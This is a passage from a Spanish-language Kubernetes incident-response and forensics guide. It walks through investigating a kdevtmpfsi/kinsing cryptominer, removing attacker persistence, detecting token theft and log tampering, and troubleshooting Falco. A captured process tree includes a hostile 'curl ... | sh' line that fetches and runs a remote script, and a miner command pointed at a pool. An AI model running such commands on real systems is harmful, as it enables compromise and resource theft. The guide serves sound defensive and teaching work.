Defaulting debug container name to debugger-x7k2m.
If you don't see a command prompt, try pressing enter.

debugger:~# ps auxf
PID   USER     TIME  COMMAND
    1 1000      2:14 node /app/server.js
  214 1000      0:00  \_ sh -c curl -s http://185.220.101.7/x.sh | sh
  219 1000      0:00      \_ sh
  341 1000     47:52          \_ ./kdevtmpfsi --url stratum+tcp://185.220.101.7:14444
  342 1000      0:00          \_ ./kinsing

debugger:~# ls -la /proc/341/cwd
lrwxrwxrwx 1 1000 1000 0 Aug  5 14:33 /proc/341/cwd -> /tmp

debugger:~# cat /proc/341/environ | tr '\0' '\n' | grep -i pool
POOL_URL=stratum+tcp://185.220.101.7:14444

debugger:~# ss -tnp
State  Recv-Q Send-Q  Local Address:Port    Peer Address:Port  Process
ESTAB  0      0       10.244.3.17:41892     185.220.101.7:14444 users:(("kdevtmpfsi",pid=341,fd=7))

debugger:~# sha256sum /proc/341/exe /proc/342/exe
b4e7c9a1f2d83e5c6a0b91d47f3e28c5a6b7d901e2f34c58a9b0d1e2f3a4b5c6  /proc/341/exe
7c2a9e4b1d6f8302c5e7a9b0d1f2e3c4a5b6d7e8f90123456789abcdef012345  /proc/342/exe
```

`kdevtmpfsi` / `kinsing` es una familia de criptominería muy conocida — **fase 9, Impact**, confirmada. Nótese que el árbol de procesos, la conexión de red y los hashes de los binarios se capturaron sin reiniciar el contenedor ni alertar al atacante con un `kubectl exec` dentro de su propia shell.

**Paso 5 — eliminar la persistencia, en orden de dependencias.** Matá primero los implantes de alcance de clúster (webhook, RBAC), luego los locales al nodo:

```
$ kubectl get mutatingwebhookconfiguration metrics-injector -o yaml \
    > /evidence/inc-2026-0805/webhook-metrics-injector.yaml
$ kubectl delete mutatingwebhookconfiguration metrics-injector
mutatingwebhookconfiguration.admissionregistration.k8s.io "metrics-injector" deleted

$ kubectl get clusterrolebinding backup-operator -o yaml \
    > /evidence/inc-2026-0805/crb-backup-operator.yaml
$ kubectl delete clusterrolebinding backup-operator
clusterrolebinding.rbac.authorization.k8s.io "backup-operator" deleted

$ kubectl -n kube-system get cronjob kube-cleanup -o yaml \
    > /evidence/inc-2026-0805/cronjob-kube-cleanup.yaml
$ kubectl -n kube-system delete cronjob kube-cleanup
cronjob.batch "kube-cleanup" deleted

# Static pod: must be removed from the node filesystem, NOT via the API.
$ kubectl debug node/node-worker-03 -it --image=busybox:1.36 --profile=sysadmin -- \
    sh -c 'cp /host/etc/kubernetes/manifests/kube-metrics-agent.yaml /host/tmp/evidence.yaml \
           && rm -f /host/etc/kubernetes/manifests/kube-metrics-agent.yaml \
           && echo removed'
removed
```

**Paso 6 — invalidar las credenciales robadas.** Un token ligado de ServiceAccount no puede revocarse individualmente; se rota el objeto subyacente:

```
$ kubectl -n prod delete serviceaccount payment-api
serviceaccount "payment-api" deleted
$ kubectl -n prod create serviceaccount payment-api
serviceaccount/payment-api created

$ kubectl -n prod rollout restart deployment/payment-api
deployment.apps/payment-api restarted

# Node identity is also suspect: the attacker had root on the node.
$ kubectl get csr | grep node-worker-03
csr-x8k2m   4m    kubernetes.io/kubelet-serving   system:node:node-worker-03   Approved,Issued
$ kubectl delete node node-worker-03
node "node-worker-03" deleted
```

### 4.7 Reconstruir a qué estaba realmente autorizada una identidad

`audit2rbac` deriva el RBAC mínimo que una identidad ejerció — invaluable tanto para dimensionar el radio de impacto como para escribir el Role de reemplazo con mínimo privilegio:

```
$ audit2rbac -f /var/log/kubernetes/audit/audit.log \
    --serviceaccount=prod:payment-api
Opening audit source...
Loading events...
Evaluating API calls...
Generating roles...
apiVersion: v1
kind: List
items:
- apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    labels:
      audit2rbac.liggitt.net/generated: "true"
      audit2rbac.liggitt.net/user: system-serviceaccount-prod-payment-api
    name: audit2rbac:system-serviceaccount-prod-payment-api
    namespace: prod
  rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["create"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
```

Esa salida es el hallazgo: un ServiceAccount de aplicación tenía `create` sobre `pods` **y** `pods/exec` **y** `list` sobre `secrets`. La concesión RBAC *era* la vulnerabilidad; la RCE fue solo el disparador.

Verificación cruzada de lo que la identidad todavía podría hacer:

```
$ kubectl auth can-i --list --as=system:serviceaccount:prod:payment-api -n prod
Resources                    Non-Resource URLs   Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io   []    []               [create]
selfsubjectaccessreviews.authorization.k8s.io  []  []             [create]
selfsubjectrulesreviews.authorization.k8s.io   []  []             [create]
secrets                      []                  []               [get list]
pods                         []                  []               [create]
pods/exec                    []                  []               [create]
                             [/healthz]          []               [get]
                             [/version]          []               [get]
```

### 4.8 Detectar un token usado fuera de su pod

Desde Kubernetes v1.29, los tokens ligados de ServiceAccount llevan anotaciones de auditoría que nombran el pod para el que fueron emitidos. Un token presentado desde un origen que no coincide con su ligadura es prueba de credencial robada:

```
$ sudo jq -c 'select(.annotations["authentication.kubernetes.io/pod-name"] != null)
              | {user: .user.username,
                 bound_pod: .annotations["authentication.kubernetes.io/pod-name"],
                 bound_uid: .annotations["authentication.kubernetes.io/pod-uid"],
                 node: .annotations["authentication.kubernetes.io/node-name"],
                 src: .sourceIPs[0], ua: .userAgent, uri: .requestURI}' \
    /var/log/kubernetes/audit/audit.log | grep 'payment-api' | tail -n 3
{"user":"system:serviceaccount:prod:payment-api","bound_pod":"payment-api-7d9c4f8b6-2xk9v","bound_uid":"5c1e9d34-7a2b-4f18-9e6c-3a0b12d4e5f7","node":"node-worker-03","src":"10.244.3.17","ua":"curl/8.5.0","uri":"/api/v1/namespaces/prod/secrets"}
{"user":"system:serviceaccount:prod:payment-api","bound_pod":"payment-api-7d9c4f8b6-2xk9v","bound_uid":"5c1e9d34-7a2b-4f18-9e6c-3a0b12d4e5f7","node":"node-worker-03","src":"203.0.113.44","ua":"kubectl/v1.34.0 (linux/amd64)","uri":"/api/v1/namespaces/prod/secrets"}
```

La segunda línea: el *mismo* token ligado, presentado desde **203.0.113.44** — una dirección fuera del CIDR del clúster — con un user agent de `kubectl`. El token fue exfiltrado y se está usando desde la máquina del propio atacante.

Enumerá cada IP de origen externa que se autenticó como un ServiceAccount interno del clúster:

```
$ sudo jq -r 'select(.user.username | startswith("system:serviceaccount:"))
              | .sourceIPs[0]' /var/log/kubernetes/audit/audit.log \
  | sort | uniq -c | sort -rn \
  | grep -Ev ' (10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)'
     47 203.0.113.44
```

### 4.9 Detectar antiforense — un hueco en el propio rastro de auditoría

La integridad del propio audit log es verificable. Un log truncado deja una discontinuidad en la secuencia de timestamps que ninguna operación legítima produce:

```
$ sudo jq -r '.requestReceivedTimestamp' /var/log/kubernetes/audit/audit.log \
  | cut -c1-16 | uniq -c | awk '$1 < 5 {print "SPARSE MINUTE:", $2, "events:", $1}'
SPARSE MINUTE: 2026-08-05T14:41 events: 1
SPARSE MINUTE: 2026-08-05T14:42 events: 0
SPARSE MINUTE: 2026-08-05T14:43 events: 2
```

Un API server en producción nunca emite menos de cinco eventos de auditoría por minuto — solo los heartbeats del kubelet ya superan eso. Un casi-silencio de tres minutos en medio de un incidente significa que el archivo fue truncado y reescrito parcialmente.

Corroborá contra los metadatos del propio archivo y el historial de reinicios del API server:

```
$ sudo stat /var/log/kubernetes/audit/audit.log
  File: /var/log/kubernetes/audit/audit.log
  Size: 187293184  Blocks: 365808   IO Block: 4096   regular file
Access: 2026-08-05 14:44:02.117482911 +0000
Modify: 2026-08-05 14:44:02.117482911 +0000
Change: 2026-08-05 14:41:18.883091447 +0000   <-- inode changed, content did not shrink legitimately
 Birth: 2026-08-04 22:03:11.117000000 +0000

$ kubectl -n kube-system get pod kube-apiserver-cp-01 \
    -o jsonpath='{.status.containerStatuses[0].restartCount}{"\n"}'
0
```

El API server nunca se reinició, así que la rotación de logs no puede explicar el timestamp de `Change`. Alguien editó el archivo. **Asumí root en el nodo del plano de control y escalá el alcance del incidente en consecuencia.**

---

## 5. Guía de verificación y diagnóstico de fallos

### 5.1 El API server no arranca después de un cambio de auditoría

Esta es la caída autoinfligida más común de este dominio, y el fallo es silencioso: `kubectl` simplemente deja de responder, así que no se puede usar `kubectl` para diagnosticarlo. Andá al nodo y usá el runtime de contenedores directamente.

```
$ kubectl get nodes
The connection to the server 10.0.0.10:6443 was refused - did you specify the right host or port?

$ sudo crictl ps -a --name kube-apiserver
CONTAINER      IMAGE          CREATED          STATE     NAME             ATTEMPT   POD ID
c8a12f4b9e3d   4a7c2b1f0e9d   12 seconds ago   Exited    kube-apiserver   7         3b1c9d8e2f7a

$ sudo crictl logs --tail 20 c8a12f4b9e3d
E0805 14:52:03.117482       1 run.go:74] "command failed" err="failed to initialize audit backend: unable to read audit policy file: open /etc/kubernetes/audit/audit-policy.yaml: no such file or directory"
```

Si `crictl` no está disponible, el kubelet escribe la salida estándar del static pod en disco:

```
$ sudo ls /var/log/pods/kube-system_kube-apiserver-cp-01_*/kube-apiserver/
0.log  1.log  2.log  3.log  4.log  5.log  6.log  7.log

$ sudo tail -n 5 /var/log/pods/kube-system_kube-apiserver-cp-01_*/kube-apiserver/7.log
2026-08-05T14:52:03.117482911Z stderr F E0805 14:52:03.117482  1 run.go:74] "command failed" err="failed to initialize audit backend: ..."

$ sudo journalctl -u kubelet --since "5 min ago" | grep -i apiserver | tail -5
Aug 05 14:52:04 cp-01 kubelet[1147]: E0805 14:52:04.221 kuberuntime_manager.go:1256] "Back-off restarting failed container" pod="kube-system/kube-apiserver-cp-01"
```

**Tabla de decisión de fallos:**

| Error en `crictl logs` | Causa raíz | Solución |
|---|---|---|
| `unable to read audit policy file: ... no such file or directory` | Los `volumeMounts` están presentes pero falta la entrada hostPath en `volumes`, o el archivo no está en **este** nodo | Agregá el volumen hostPath; verificá con `ls` en el nodo; en multi-master, copiá la política a **todos** los nodos de plano de control |
| `error initializing audit backend: ... permission denied` | El directorio de logs no es escribible, o está montado con `readOnly: true` | Poné `readOnly: false` en el volumeMount del log; `chmod 700` al directorio, propietario `root` |
| `unknown field "levels"` / `error decoding audit policy` | Error de tipeo en la política (`level:` vs `levels:`, `apiVersion` incorrecta) | La `apiVersion` debe ser exactamente `audit.k8s.io/v1`; validá el YAML |
| `no such file or directory` sobre el **kubeconfig del webhook** | El mismo problema de montaje, otro archivo | Montá el directorio `/etc/kubernetes/audit` completo, no archivos individuales |
| El pod ni siquiera aparece en `crictl ps -a` | El YAML del static pod es inválido; el kubelet no puede parsearlo | `sudo journalctl -u kubelet \| grep -i "manifest"`; restaurá desde el backup de `/etc/kubernetes/manifests` |
| Arranca, pero no aparece ningún archivo `audit.log` | La política mapeó todo a `level: None`, o falta `--audit-log-path` | Comprobá que exista una regla catch-all `level: Metadata` al final |

> **Siempre hacé un backup antes de editar un manifiesto de static pod:**
> ```
> $ sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.bak
> ```
> La recuperación es entonces `sudo cp /root/kube-apiserver.yaml.bak /etc/kubernetes/manifests/kube-apiserver.yaml` — el kubelet detecta el cambio en ~20 s y reinicia el pod. Nótese que mover el archivo *fuera* de `/etc/kubernetes/manifests` detiene el API server por completo; volver a moverlo adentro lo reinicia. Esta es la palanca estándar de recuperación del plano de control.

### 5.2 Verificar que la audit policy captura realmente lo que creés

Nunca confíes en una política leyéndola. Generá un evento conocido y buscalo con grep.

```
$ kubectl -n default run audit-probe --image=busybox:1.36 --restart=Never -- sleep 30
pod/audit-probe created

$ sudo grep '"name":"audit-probe"' /var/log/kubernetes/audit/audit.log \
  | jq -c '{level, stage, verb, user: .user.username,
            has_body: (.requestObject != null)}'
{"level":"Request","stage":"ResponseComplete","verb":"create","user":"kubernetes-admin","has_body":true}
```

`level: Request` y `has_body: true` confirman que la Sección A5 funciona. Ahora verificá la regla de exec:

```
$ kubectl -n default exec -it audit-probe -- sh -c 'echo probe'
probe

$ sudo grep 'audit-probe' /var/log/kubernetes/audit/audit.log \
  | jq -c 'select(.objectRef.subresource=="exec")
           | {level, stage, uri: .requestURI, code: .responseStatus.code}'
{"level":"RequestResponse","stage":"ResponseStarted","uri":"/api/v1/namespaces/default/pods/audit-probe/exec?command=sh&command=-c&command=echo+probe&container=audit-probe&stdin=true&stdout=true&tty=true","code":101}
{"level":"RequestResponse","stage":"ResponseComplete","uri":"/api/v1/namespaces/default/pods/audit-probe/exec?...","code":101}
```

Ambos stages presentes, y el comando ejecutado es visible en la query string. **Este es el chequeo que prueba que no omitiste `ResponseStarted`.**

Verificá que la supresión de ruido no sea demasiado amplia — una política que silencia accidentalmente a un atacante es peor que ninguna política:

```
$ sudo jq -r '.level' /var/log/kubernetes/audit/audit.log | sort | uniq -c | sort -rn
 981204 Metadata
  22417 Request
   1882 RequestResponse

$ sudo jq -r 'select(.user.username | startswith("system:node:")) | .verb' \
    /var/log/kubernetes/audit/audit.log | sort | uniq -c
   4412 create
    881 patch
   1204 update
# get/list/watch correctly suppressed by rule C2; writes still captured.
```

```
$ kubectl -n default delete pod audit-probe
pod "audit-probe" deleted
```

### 5.3 Falco corre pero no produce eventos

Recorré la cadena hacia abajo: driver → motor → reglas → salida.

```
$ kubectl -n falco get pods -o wide
NAME                 READY   STATUS    RESTARTS   AGE   IP           NODE
falco-8k2mq          1/1     Running   0          3h    10.0.1.21    node-worker-01
falco-x7n4p          0/1     Error     6          9m    10.0.1.23    node-worker-03

$ kubectl -n falco logs falco-x7n4p
Fri Aug  5 14:55:01 2026: Falco version: 0.41.0 (x86_64)
Fri Aug  5 14:55:01 2026: Falco initialized with configuration files:
Fri Aug  5 14:55:01 2026:    /etc/falco/falco.yaml
Fri Aug  5 14:55:01 2026: Loading rules from:
Fri Aug  5 14:55:01 2026:    /etc/falco/falco_rules.yaml
Fri Aug  5 14:55:01 2026:    /etc/falco/rules.d/attack-phases.yaml
Fri Aug  5 14:55:02 2026: Unable to load the driver.
Fri Aug  5 14:55:02 2026: Runtime error: can't open BPF probe '/root/.falco/falco_ubuntu-generic_6.8.0-45-generic_45.o': No such file or directory
```

| Síntoma | Causa | Verificación | Solución |
|---|---|---|---|
| `can't open BPF probe` / `Unable to load the driver` | Sonda eBPF legacy no compilada para este kernel | `uname -r`; `ls /root/.falco/` | Cambiá a eBPF moderno (`driver.kind=modern_ebpf`) si el kernel es ≥ 5.8 con BTF: `ls /sys/kernel/btf/vmlinux` |
| `Error: Cannot find any entry in the driver` (kmod) | Faltan headers de kernel / Secure Boot bloquea módulos sin firmar | `mokutil --sb-state`; `ls /lib/modules/$(uname -r)/build` | Usá eBPF moderno; kmod no es viable bajo Secure Boot |
| Pod en `Running` pero cero eventos para cualquier regla | El motor arrancó sin fuente de syscalls (imagen solo-plugins) | `kubectl -n falco logs … \| grep -i "syscall"` | Usá `falcosecurity/falco` (con driver), no `falco-no-driver` |
| Solo algunas reglas se disparan | La prioridad de la regla está por debajo del umbral configurado | `grep '^priority' /etc/falco/falco.yaml` | Bajá `priority:` en `falco.yaml` (p. ej. `debug`) |
| La regla se dispara pero `%k8s.ns.name` es `<NA>` | Enriquecimiento con metadatos de Kubernetes no disponible | Comprobá que el plugin `k8smeta` / metacollector esté desplegado y alcanzable | Desplegá `falco-k8s-metacollector` y configurá `k8smeta`; el enriquecimiento solo desde el runtime de contenedores da menos campos |
| Regla personalizada ignorada en silencio | Error de parseo del YAML, o `required_engine_version` demasiado alta | `falco -c /etc/falco/falco.yaml -V /etc/falco/rules.d/attack-phases.yaml` | Corregí el error reportado |

Validá las reglas sin reiniciar el DaemonSet:

```
$ kubectl -n falco exec falco-8k2mq -- \
    falco --validate /etc/falco/rules.d/attack-phases.yaml
Fri Aug  5 15:02:11 2026: Validating rules file(s):
Fri Aug  5 15:02:11 2026:    /etc/falco/rules.d/attack-phases.yaml
/etc/falco/rules.d/attack-phases.yaml: Ok
```

Generá un disparador conocido y confirmá de punta a punta:

```
$ kubectl run falco-probe --image=busybox:1.36 --restart=Never -- sh -c 'sleep 5; id; sleep 300'
pod/falco-probe created

$ kubectl -n falco logs -l app.kubernetes.io/name=falco --since=1m | grep falco-probe
15:04:12.882910337: Notice Recon tool executed in container (tool=id cmdline=id parent=sh container_id=b91f04d7c2ae image=docker.io/library/busybox ns=default pod=falco-probe)

$ kubectl delete pod falco-probe
pod "falco-probe" deleted
```

Las métricas internas de Falco dicen si el buffer del kernel está descartando eventos — un hueco de detección silencioso que se ve exactamente igual que "no está pasando ningún ataque":

```
$ kubectl -n falco logs falco-8k2mq | grep -i "falco internal" | tail -2
{"hostname":"node-worker-01","output":"Falco internal: metrics snapshot","output_fields":{"falco.duration_sec":10800,"scap.n_evts":48219337,"scap.n_drops":0,"scap.n_drops_buffer_total":0,"falco.num_evts":48219337},"priority":"Informational","rule":"Falco internal: metrics snapshot","time":"2026-08-05T15:00:00Z"}
```

> `scap.n_drops > 0` significa que el ring buffer del kernel se desbordó y **hubo syscalls que nunca se evaluaron**. Subí `syscall_buf_size_preset` en `falco.yaml`, o reducí la carga ajustando `base_syscalls`. Un clúster con descartes tiene un punto ciego intermitente y no medido.

### 5.4 El webhook de auditoría no entrega a Falco

```
$ kubectl -n falco logs falco-k8saudit-2m8xz | tail -5
Fri Aug  5 15:10:02 2026: Loaded plugins: k8saudit, json
Fri Aug  5 15:10:02 2026: Starting webserver, listening on 0.0.0.0:9765
# ...and then nothing. No events.
```

Diagnosticá desde el nodo del plano de control, en el mismo namespace de red que usa el API server:

```
$ sudo ss -tlnp | grep 9765
LISTEN 0  4096  0.0.0.0:9765  0.0.0.0:*  users:(("falco",pid=88412,fd=12))

$ curl -s -o /dev/null -w '%{http_code}\n' -X POST \
    -H 'Content-Type: application/json' \
    -d '{"kind":"EventList","apiVersion":"audit.k8s.io/v1","items":[]}' \
    http://127.0.0.1:9765/k8s-audit
200

$ sudo journalctl -u kubelet --since "10 min ago" | grep -i "audit.*webhook"
# (nothing — check the API server's own log instead)

$ sudo crictl logs $(sudo crictl ps -q --name kube-apiserver) 2>&1 | grep -i webhook | tail -3
E0805 15:11:44.882 webhook.go:154] Failed to make webhook authenticator request: Post "http://10.96.44.12:9765/k8s-audit": dial tcp 10.96.44.12:9765: i/o timeout
```

| Síntoma | Causa | Solución |
|---|---|---|
| `dial tcp <ClusterIP>: i/o timeout` | La URL del webhook apunta a un Service `ClusterIP`; el API server marca desde el netns del host donde las VIP de Service pueden no resolverse, y esto crea una dependencia de arranque | Apuntá a `http://127.0.0.1:9765` y corré Falco como DaemonSet con `hostNetwork` que tolere los taints del plano de control |
| `connection refused` | Falco no está planificado en **este** nodo de plano de control | Agregá la toleración del plano de control + `nodeSelector` |
| Llegan eventos pero ninguna regla se dispara | Las reglas declaran `source: syscall` en lugar de `source: k8s_audit` | Toda regla de auditoría debe fijar `source: k8s_audit` |
| `x509: certificate signed by unknown authority` | Endpoint HTTPS sin la CA en el kubeconfig del webhook | Agregá `certificate-authority-data`, o usá HTTP plano sobre loopback |
| Entrega a ráfagas, huecos bajo carga | Throttling del modo `batch` | Subí `--audit-webhook-batch-throttle-qps` / `-burst` |
| Eventos enormes faltan en silencio | El evento excede `maxEventSize` | Subí `maxEventSize` en el `init_config` del plugin **y** `--audit-webhook-truncate-max-event-size` |

### 5.5 Fallos de adquisición de evidencia

```
$ sudo curl -sk -X POST \
    --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \
    --key  /etc/kubernetes/pki/apiserver-kubelet-client.key \
    "https://node-worker-03:10250/checkpoint/prod/payment-api-7d9c4f8b6-2xk9v/app"
{"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"checkpointing of prod/payment-api-7d9c4f8b6-2xk9v/app failed (checkpointing container app failed: rpc error: code = Unknown desc = checkpointing not supported)","code":500}
```

| Síntoma | Causa | Solución |
|---|---|---|
| `checkpointing not supported` | CRI-O/containerd compilado sin soporte CRIU, o CRIU no instalado en el nodo | Instalá `criu` en el nodo; containerd ≥ 1.7 con CRIU, o CRI-O con `enable_criu_support = true` |
| `404 page not found` | Feature gate `ContainerCheckpoint` deshabilitado en el kubelet | Agregá `--feature-gates=ContainerCheckpoint=true` (beta y activo por defecto desde v1.30) |
| `401 Unauthorized` | Certificado de cliente incorrecto para la API del kubelet | Usá `apiserver-kubelet-client.{crt,key}`, que está en la cadena de CA autorizada del kubelet |
| El checkpoint tiene éxito, el archivo es diminuto | El contenedor casi no tenía estado en la capa escribible — este es un resultado válido, no un error | Corroborá con el contenido de `rootfs-diff.tar` |
| `kubectl debug` se cuelga en "If you don't see a command prompt…" | `EphemeralContainers` no soportado, o la imagen de debug no se puede descargar en un nodo en cuarentena | `kubectl -n prod get pod X -o jsonpath='{.spec.ephemeralContainers}'`; pre-descargá la imagen, o usá `kubectl debug node/<node>` |
| `kubectl debug node/<n>` no logra planificarse | El taint `NoExecute` de cuarentena | El pod de debug no hereda tolerancias — agregá la toleración del taint o usá `--profile=sysadmin` con un patch explícito |
| `kubectl logs` no devuelve nada | El contenedor ya se reinició | `kubectl logs <pod> --previous`; luego `/var/log/pods/<ns>_<pod>_<uid>/<container>/*.log` en el nodo, que sobrevive a los reinicios hasta el GC |

### 5.6 La checklist de verificación de este dominio

Ejecutala como control periódico, no solo durante un incidente:

```
# 1. Audit policy is loaded and non-trivial
$ sudo grep -c 'level:' /etc/kubernetes/audit/audit-policy.yaml
18

# 2. Audit log is growing
$ sudo stat -c '%s %y' /var/log/kubernetes/audit/audit.log; sleep 10; \
  sudo stat -c '%s %y' /var/log/kubernetes/audit/audit.log
187293184 2026-08-05 15:20:11.117482911 +0000
187341022 2026-08-05 15:20:21.884019773 +0000

# 3. Runtime sensor present on EVERY node (no coverage holes)
$ kubectl get nodes --no-headers | wc -l; \
  kubectl -n falco get ds falco -o jsonpath='{.status.numberReady}{"\n"}'
7
7

# 4. High-value rules are actually loaded
$ kubectl -n falco exec ds/falco -- falco -L 2>/dev/null | grep -Ei 'escape|token|shell'
Container escape attempt via namespace switch
ServiceAccount token read by suspicious process
Shell spawned in container

# 5. No kernel event drops
$ kubectl -n falco logs -l app.kubernetes.io/name=falco --tail=200 \
  | jq -r 'select(.rule=="Falco internal: metrics snapshot")
           | "\(.hostname) drops=\(.output_fields["scap.n_drops"])"' | sort -u
node-worker-01 drops=0
node-worker-02 drops=0
node-worker-03 drops=0

# 6. Alerts reach a destination that survives cluster compromise
$ kubectl -n falco logs -l app.kubernetes.io/name=falcosidekick --tail=3
2026/08/05 15:20:44 [INFO]  : Elasticsearch - Post OK (201)
2026/08/05 15:20:44 [INFO]  : Slack - Post OK (200)

# 7. No cluster-admin bindings created outside the change window
$ kubectl get clusterrolebindings -o json \
  | jq -r '.items[] | select(.roleRef.name=="cluster-admin")
           | "\(.metadata.creationTimestamp) \(.metadata.name)"' | sort

# 8. No webhook pointing outside the cluster
$ kubectl get mutatingwebhookconfigurations -o json \
  | jq -r '.items[].webhooks[] | select(.clientConfig.url != null)
           | "\(.name) -> \(.clientConfig.url)"'

# 9. No unexpected static pods on any node
$ for n in $(kubectl get nodes -o name); do
    echo "== $n"; kubectl debug $n -q --image=busybox:1.36 --profile=sysadmin -- \
      ls /host/etc/kubernetes/manifests/ 2>/dev/null
  done
```

Que cualquiera de estos devuelva un valor inesperado es un punto de partida de investigación, no un problema cosmético. El ítem 3 en particular — un DaemonSet en 6/7 listo — significa que un nodo estuvo corriendo sin monitoreo, y ese es exactamente el nodo que un atacante va a encontrar.

---

## 6. Referencias

**Documentación oficial de Kubernetes**

- Auditing — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Referencia de la API de Audit Policy (`audit.k8s.io/v1`) — https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
- Referencia de línea de comandos de kube-apiserver — https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/
- Debug Running Pods (contenedores efímeros, `kubectl debug`) — https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/
- Forensic Container Checkpointing — https://kubernetes.io/docs/reference/node/kubelet-checkpoint-api/
- Blog: Forensic container checkpointing in Kubernetes — https://kubernetes.io/blog/2022/12/05/forensic-container-checkpointing-alpha/
- Blog: Forensic container analysis — https://kubernetes.io/blog/2023/03/10/forensic-container-analysis/
- Managing Service Accounts y tokens ligados — https://kubernetes.io/docs/concepts/security/service-accounts/
- Kubelet authentication and authorization — https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/
- Static Pods — https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/
- Network Policies — https://kubernetes.io/docs/concepts/services-networking/network-policies/
- Taints and Tolerations — https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/
- Dynamic Admission Control (webhooks) — https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/
- Pod Security Standards — https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Security Checklist — https://kubernetes.io/docs/concepts/security/security-checklist/

**Modelos de amenazas y taxonomías**

- MITRE ATT&CK — Containers Matrix — https://attack.mitre.org/matrices/enterprise/containers/
- MITRE ATT&CK — T1611 Escape to Host — https://attack.mitre.org/techniques/T1611/
- MITRE ATT&CK — T1613 Container and Resource Discovery — https://attack.mitre.org/techniques/T1613/
- MITRE ATT&CK — T1552.007 Container API — https://attack.mitre.org/techniques/T1552/007/
- Microsoft — Threat matrix for Kubernetes — https://microsoft.github.io/Threat-Matrix-for-Kubernetes/
- NIST SP 800-190, Application Container Security Guide — https://csrc.nist.gov/pubs/sp/800/190/final
- NIST SP 800-61r2, Computer Security Incident Handling Guide — https://csrc.nist.gov/pubs/sp/800/61/r2/final
- CISA/NSA Kubernetes Hardening Guidance — https://www.cisa.gov/news-events/alerts/2022/03/15/updated-kubernetes-hardening-guide

**Herramientas de seguridad en runtime**

- Documentación de Falco — https://falco.org/docs/
- Referencia de reglas de Falco (campos, condiciones, prioridades) — https://falco.org/docs/reference/rules/
- Campos soportados por Falco — https://falco.org/docs/reference/rules/supported-fields/
- Plugin `k8saudit` de Falco — https://github.com/falcosecurity/plugins/tree/main/plugins/k8saudit
- Plugin `k8smeta` de Falco y metacollector — https://github.com/falcosecurity/k8s-metacollector
- Drivers de Falco (eBPF moderno, sonda eBPF, módulo de kernel) — https://falco.org/docs/concepts/event-sources/kernel/
- Falcosidekick (enrutado de alertas) — https://github.com/falcosecurity/falcosidekick
- Documentación de Cilium Tetragon — https://tetragon.io/docs/
- Referencia de TracingPolicy de Tetragon — https://tetragon.io/docs/concepts/tracing-policy/
- Cilium Hubble (observabilidad de flujos de red) — https://docs.cilium.io/en/stable/observability/hubble/
- Aqua Tracee — https://aquasecurity.github.io/tracee/latest/
- CRIU (checkpoint/restore in userspace) — https://criu.org/Main_Page
- `audit2rbac` — https://github.com/liggitt/audit2rbac
- `kubectl-who-can` — https://github.com/aquasecurity/kubectl-who-can

**Certificación**

- CNCF CKS Curriculum v1.34 — https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
- Página del examen CKS (Linux Foundation) — https://training.linuxfoundation.org/certification/certified-kubernetes-security-specialist/